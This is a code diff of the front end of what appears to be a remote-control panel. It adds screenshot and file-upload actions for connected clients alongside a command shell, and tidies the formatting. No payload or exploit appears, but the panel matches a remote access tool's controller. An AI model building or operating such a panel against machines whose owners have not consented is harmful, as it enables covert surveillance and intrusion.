@@ -8,7 +8,7 @@ function createTd(text, button, listener, colSpan) {
 
 function populateTable(data) {
 	const table = document.getElementById('clients')
-	const tableBody = table.getElementsByTagName('tbody')[ 0 ]
+	const tableBody = table.getElementsByTagName('tbody')[0]
 	tableBody.innerHTML = ''
 	if (!data.length) {
 		const row = document.createElement('tr')
@@ -22,24 +22,10 @@ function populateTable(data) {
 
 		const actions = ['Run Command', 'Upload file', 'Open file', 'View Screen']
 		actions.forEach((action) => {
-			if (action == 'View Screen')
-				return row.appendChild(
-					createTd(action, true, () => {
-						fetch('/screenshot', {
-							method: 'POST',
-							headers: {'Content-Type': 'application/json'},
-							body: JSON.stringify({clientId: item.clientId})
-						})
-							.then((res) => res.json())
-							.then((screenshotData) => {
-								const img = document.getElementById('ss-img')
-								img.src = `data:image/png;base64,${screenshotData.buffer}`
-								document.getElementById('ss-container').classList.remove('hidden')
-							})
-							.catch((error) => console.error('Error fetching screenshot:', error))
-					})
-				)
+			if (action == 'View Screen') return row.appendChild(createTd(action, true, () => getScreenshot(item.clientId)))
 			else if (action == 'Run Command') return row.appendChild(createTd(action, true, () => showCLI(item.clientId)))
+			else if (action == 'Upload file') return row.appendChild(createTd(action, true, () => uploadFile(item.clientId)))
+
 			row.appendChild(createTd(action, true, () => true))
 		})
 
@@ -61,6 +47,53 @@ document.getElementById('refresh').addEventListener('click', () =>
 		.then((res) => populateTable(res))
 )
 
+function getScreenshot(clientId) {
+	setMessage('Fetching Screenshot...')
+	fetch('/screenshot', {
+		method: 'POST',
+		headers: {'Content-Type': 'application/json'},
+		body: JSON.stringify({clientId})
+	})
+		.then((res) => res.json())
+		.then((screenshotData) => {
+			const img = document.getElementById('ss-img')
+			img.src = `data:image/png;base64,${screenshotData.buffer}`
+			document.getElementById('ss-container').classList.remove('hidden')
+		})
+		.catch((error) => setMessage(error.message, true))
+}
+
+function uploadFile(clientId) {
+	const fileInput = document.getElementById('fileInput')
+	fileInput.click()
+	fileInput.onchange = () => {
+		const file = fileInput.files[0]
+
+		if (!file) return console.log('no file')
+
+		const form = new FormData()
+		form.append('file', file)
+		form.append('clientId', clientId)
+		fetch('/upload', {
+			method: 'POST',
+			body: form
+		})
+			.then((response) => response.json())
+			.then(() => setMessage('Uploaded File'))
+			.catch((error) => setMessage(error.message, true))
+	}
+}
+
+function setMessage(content, error) {
+	const messageDiv = document.getElementById('message')
+	messageDiv.classList.remove('error')
+	messageDiv.textContent = content
+
+	if (error) messageDiv.classList.add('error')
+	messageDiv.classList.remove('hidden')
+	
+	setTimeout(() => messageDiv.classList.add('hidden'), 5000)
+}
 
 function showCLI(clientId) {
 	const cliInput = document.getElementById('cli-input')
@@ -69,7 +102,7 @@ function showCLI(clientId) {
 
 	document.getElementById('cli').classList.remove('hidden')
 	cliPrefix.textContent = `${clientId}> `
-	
+
 	cliInput.addEventListener('keydown', async (event) => {
 		if (event.key === 'Enter') {
 			const command = cliInput.value.trim()
@@ -111,13 +144,13 @@ function showCLI(clientId) {
 		}
 	}
 
-    function displayOutput(output) {
-        const formattedOutput = output.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\r\n/g, '<br>')
-        const outputLine = document.createElement('div');
-        outputLine.innerHTML = formattedOutput;
-        outputDiv.appendChild(outputLine);
+	function displayOutput(output) {
+		const formattedOutput = output.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\r\n/g, '<br>')
+		const outputLine = document.createElement('div')
+		outputLine.innerHTML = formattedOutput
+		outputDiv.appendChild(outputLine)
 		scrollToBottom()
-    }
+	}
 	function scrollToBottom() {
 		const cli = document.getElementById('cli-container')
 		cli.scrollTop = cli.scrollHeight
